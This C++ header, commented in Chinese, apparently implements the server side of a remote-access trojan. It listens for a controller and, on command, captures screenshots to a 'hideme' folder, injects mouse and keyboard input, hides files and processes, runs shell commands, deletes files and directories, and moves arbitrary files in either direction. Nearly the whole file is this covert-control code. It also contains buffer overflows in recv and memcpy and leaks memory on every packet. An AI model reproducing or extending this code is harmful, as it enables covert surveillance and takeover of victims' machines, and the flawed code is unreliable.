#include"MLHT.h"
#include "Op_Function.h"
#include "SceenShoot.h"


#define SOCKET_BUFFER_SIZE (MLHT_MAX_LENGTH+1)


//报文接收返回值
#define PACKET_ACCEPT_SUCCESS	0
#define PACKET_ACCEPT_FAIL		1
#define FILE_OPEN_FAIL			2

#define FILE_READ_FAIL			3
#define FILE_WRITE_FAIL			4
#define	FILE_LS_FAIL			5

#define NOT_GET_ACK				6
#define GET_ACK					7


class MLHT_SERVER
{
public:
	//监听socket
	WSADATA wsaData;
	SOCKET s;
	sockaddr_in sockaddr;
	int server_port;

	//客户端socket
	SOCKADDR clientAddr;
	SOCKET clientsocket;

	char buffer[MLHT_MAX_LENGTH];
	
	WORD IDtt;
	
	MLHT *p_send;//上一个发出的报文
	MLHT *p_get; //上一个收到的报文

public:
	MLHT_SERVER(int port){

		IDtt = 1;

		p_send = new MLHT();
		p_get = new MLHT();


		WSAStartup(MAKEWORD(2, 2), &wsaData);
		//本函数必须是应用程序或DLL调用的第一个Windows Sockets函数。
		//它允许应用程序或DLL指明Windows Sockets API的版本号及获得特定Windows Sockets实现的细节。
		//应用程序或DLL只能在一次成功的WSAStartup()调用之后才能调用进一步的Windows Sockets API函数
		s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		sockaddr.sin_family = PF_INET;//sin_family指代协议族，在socket编程中只能是AF_INET
		sockaddr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");   //需要绑定到本地的哪个IP地址
		sockaddr.sin_port = htons(port);      //需要监听的端口
		//sin_zero是为了让sockaddr与sockaddr_in两个数据结构保持大小相同而保留的空字节

		bind(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));     //进行绑定动作

		listen(s, 1);                                        //启动监听

	}

	//等待客户端连接
	void WaitForClient(){
		int size = sizeof(SOCKADDR);
		clientsocket = accept(s, &clientAddr, &size);               //阻塞，直到有新tcp客户端连接
		SendACKPacket();
	}

	//等待返回报文，检测返回报文是否合法
	int WaitReturnPacket(){
		
		ZeroMemory(buffer, sizeof(buffer));

		if(recv(clientsocket, buffer, SOCKET_BUFFER_SIZE, NULL) != SOCKET_ERROR){
			if(p_get->PacketAccept(((BYTE*)buffer)))
				return PACKET_ACCEPT_SUCCESS;
			else
				return PACKET_ACCEPT_FAIL;
		}
		
		return SOCKET_ERROR;

	}

	//wait for ack packet
	int WaitforACKPacket(){

		int ret = WaitReturnPacket();
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;
		if(p_get->PacketAnalyze_SYNACKFIN()!=MLHT_MTU_TYPE_ACK)
			return NOT_GET_ACK;

		return PACKET_ACCEPT_SUCCESS;
	}

	//发ACK返回报文
	void SendACKPacket(){

		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(p_get->GetPacketId(),MLHT_MTU_TYPE_ACK|p_get->GetPacketType());
		p_send->PacketSplice((BYTE*)buffer);
		send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//发送报文

	}

	//发FIN返回报文
	void SendFINPacket(){

		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(p_get->GetPacketId(),MLHT_MTU_TYPE_FIN|p_get->GetPacketType());
		p_send->PacketSplice((BYTE*)buffer);
		send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//发送报文

	}

	//发无参数报文
	int SendPacket(WORD mtu_type){

		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(IDtt++,mtu_type);
		p_send->PacketSplice((BYTE*)buffer);
		send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//发送报文

		return WaitforACKPacket();

	}

	//发带参数报文
	int SendPacket(WORD mtu_type,WORD slicenum,WORD slicesum,char* content,WORD contentlength){
		
		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(IDtt++,mtu_type,slicenum,slicesum,(BYTE*)content,contentlength);
		p_send->PacketSplice((BYTE*)buffer);
		send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//发送报文

 		return WaitforACKPacket();
	}

	//传输文件包
	int SendFilePacket(
		WORD mtu_type,			//文件操作协议类型
		char*srcfiledir			//文件路径
		)
	{
		int ret;

		FILE *fp = NULL;//定义文件指针
		if (fopen_s(&fp,srcfiledir,"rb") != NULL)//打开文件
		{
			printf("%d",errno);
			return FILE_READ_FAIL;
		}
		
		//计算总分片数
		fseek(fp,0L,SEEK_END);			// 定位到文件末尾
		int contentlen = ftell(fp);		//返回指针偏离文件头的位置(即文件中字符个数)
		WORD slice_sum = contentlen/MLHT_SLICE_FILE_LENGTH;
		if(contentlen % MLHT_SLICE_FILE_LENGTH)
			slice_sum++;
		
		printf("Sending packets,Total %d packets...\n",slice_sum);

		char p[MLHT_SLICE_FILE_LENGTH]={0};//文件指针


		//分片1->n-1: 向客户端/服务器发送文件分片
		for(WORD slice_num = 1;slice_num < slice_sum;slice_num++){

			fseek(fp,MLHT_SLICE_FILE_LENGTH*(slice_num-1),SEEK_SET); // 顺序定位文件指针
			fread(p,MLHT_SLICE_FILE_LENGTH,1,fp);					 // 丛文件指针开始读

			ret = SendPacket(mtu_type,slice_num,slice_sum,p,MLHT_SLICE_FILE_LENGTH);
			if(ret != PACKET_ACCEPT_SUCCESS)
				return ret;
							
		}


		//分片n ：向客户端/服务器发送结尾分片
		fseek(fp,MLHT_SLICE_FILE_LENGTH*(slice_sum-1),SEEK_SET); // 顺序定位文件指针
		fread(p,contentlen%MLHT_SLICE_FILE_LENGTH,1,fp); // 丛文件指针开始读

		ret = SendPacket(mtu_type,slice_sum,slice_sum,p,contentlen%MLHT_SLICE_FILE_LENGTH);
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;
		
		printf("Send over.\n",p_send->GetPacketSliceNum(),p_send->GetPacketSliceSum());
		return PACKET_ACCEPT_SUCCESS;

	}


	//接收文件包
	int GetFilePacket(
		char* desfilename		//保存文件的目标路径
		)
	{

		int ret;

		FILE* fp = NULL;

		do{
			ret = WaitReturnPacket();
			switch(ret)
			{
			case PACKET_ACCEPT_SUCCESS:
				{
					fopen_s(&fp,desfilename,"ab");
					if(fp != NULL) //创建一个以追加形式（允许读写）文件。
					{
						//将各个分片的内容以追加的形式写入文件中
						if(fwrite(p_get->GetPacketContent(),p_get->GetPacketLength()-MLHT_HEADER_LENGTH, 1, fp)!= 1){	
							printf("%d	",errno );
							return FILE_WRITE_FAIL;
						}
						else{
							printf("Get packet %d,Total %d packets...\n",p_get->GetPacketSliceNum(),p_get->GetPacketSliceSum());
							SendACKPacket();
							printf("Send ACK packet back...\n");
							fclose(fp);
						}
					}
					else{
						printf("%d	",errno );
						return FILE_OPEN_FAIL;
					}
				}
				break;
			default:
				return ret;
			}
		}while(!p_get->IsLastPacket());

		return PACKET_ACCEPT_SUCCESS;
	}

	///RC OPERATR
	int GetScreenshoot(){
		
		char Screenshootdir[MAX_PATH] = "d:\\hideme\\screen.bmp";

		printf("ScreenShoot over,sending packet:\n");

		SceenShoot();

		return SendFilePacket(MLHT_MTU_TYPE_RC_SCREEN,Screenshootdir);
	}


	void GetMouseOperate(){

		BYTE* z = p_get->GetPacketContent();
		int x =z[0]*BYTE_SIZE+z[1];
		int y =z[2]*BYTE_SIZE+z[3];
		mouse_op(x,y);

	}


	void GetKeybroadOperate(){
		
		BYTE* z = p_get->GetPacketContent();
		int x =z[0]*BYTE_SIZE+z[1];

		keybd_op(x);

	}

	//File Operate
	void GetFileHide(){
		hide_file();
	}

	void GetFileShow(){
		show_file();
	}

	//Process Operate
	void GetProcessHide(){
		hide_process();
	}

	void GetProcessShow(){
		show_process();
	}

	//Shell Operate
	int GetShellLs(){
		char path[MLHT_MAX_LENGTH] = {0};
		//if(ListDir((char *)p_get->GetPacketContent(),path))
		if(execmd(path))
		{   printf("%s",path);
			return SendPacket(MLHT_MTU_TYPE_SHELL_LS,1,1,path,strlen(path)+1);
		}
		else
			return FILE_LS_FAIL;
		
	}
		
	void GetShellMkdir(){
		if(CrtDir((char *)p_get->GetPacketContent()))
			SendACKPacket();
		else
			SendFINPacket();
	}
		
	void GetShellRmdir(){
		if(DltDir((char *)p_get->GetPacketContent()))
			SendACKPacket();
		else
			SendFINPacket();
	}
		
	void GetShellRm(){
		if(deletfile((char *)p_get->GetPacketContent()))
			SendACKPacket();
		else
			SendFINPacket();
	}
		
	//接收上传文件
	int GetUploadFile(){
		char desfilename[MAX_PATH];
		memcpy(desfilename,p_get->GetPacketContent(),p_get->GetPacketLength()-MLHT_HEADER_LENGTH);
		printf("Upload file path: %s\n",desfilename);

		return GetFilePacket(desfilename);
	}

	//发送下载文件
	int SendDownloadFile(){
		char srcfiledir[MAX_PATH];
		memcpy(srcfiledir,p_get->GetPacketContent(),p_get->GetPacketLength()-MLHT_HEADER_LENGTH);
		printf("Download file path: %s\n",srcfiledir);
		
		return SendFilePacket(MLHT_MTU_TYPE_SHELL_DOWNLOAD,srcfiledir);

	}

 };